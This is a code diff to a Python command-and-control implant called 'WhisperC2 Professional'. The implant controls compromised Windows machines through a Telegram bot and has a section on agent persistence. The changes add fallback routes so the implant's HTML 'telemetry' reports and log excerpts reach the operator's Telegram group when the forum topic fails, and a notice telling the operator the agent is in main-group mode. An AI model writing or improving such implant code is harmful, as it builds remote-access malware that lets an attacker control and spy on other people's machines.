@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Final Production Build (Corrected)
+# WhisperC2 Professional – Final Production Build (Fallback Telemetry Fixed)
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -137,23 +137,35 @@ def generate_telemetry_report(status: str) -> str:
     return html
 
 def send_telemetry(topic_id, status: str) -> bool:
-    if not topic_id:
-        return False
+    """Send telemetry to the forum topic if available, otherwise to the main group."""
     html_content = generate_telemetry_report(status)
+    bio = io.BytesIO(html_content.encode('utf-8'))
+    bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+
+    # Try to send to the forum topic first
+    if topic_id:
+        try:
+            bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
+            log(f"Telemetry HTML report sent to topic ({status})")
+            return True
+        except Exception as e:
+            print(f"Topic telemetry failed: {e}")
+
+    # Fallback: send to main group (always works)
     try:
-        bio = io.BytesIO(html_content.encode('utf-8'))
-        bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
-        bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
-        log(f"Telemetry HTML report sent ({status})")
+        bot.send_document(GROUP_CHAT_ID, bio)
+        log(f"Telemetry HTML report sent to main group ({status})")
         return True
     except Exception as e:
-        print(f"Telemetry HTML failed: {e}")
-        plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([x['msg'] for x in log_lines[-10:]]) + "\n```"
-        try:
-            bot.send_message(GROUP_CHAT_ID, plain, message_thread_id=topic_id, parse_mode='Markdown', timeout=10)
-            return True
-        except:
-            return False
+        print(f"Main group telemetry failed: {e}")
+
+    # Final fallback: plain‑text message
+    plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([x['msg'] for x in log_lines[-10:]]) + "\n```"
+    try:
+        bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
+        return True
+    except:
+        return False
 
 # -----------------------------------------------------------------------------
 # Agent identity & persistence
@@ -437,6 +449,11 @@ def main():
     if not topic_id:
         log("Could not create forum topic – falling back to main group (with hostname filter)")
         topic_id = None
+        # Notify the operator in the main group
+        try:
+            bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
+        except:
+            pass
 
     log(f"Agent ID: {SYSTEM_ID}, Topic: {topic_id if topic_id else 'main (filtered)'}")
 
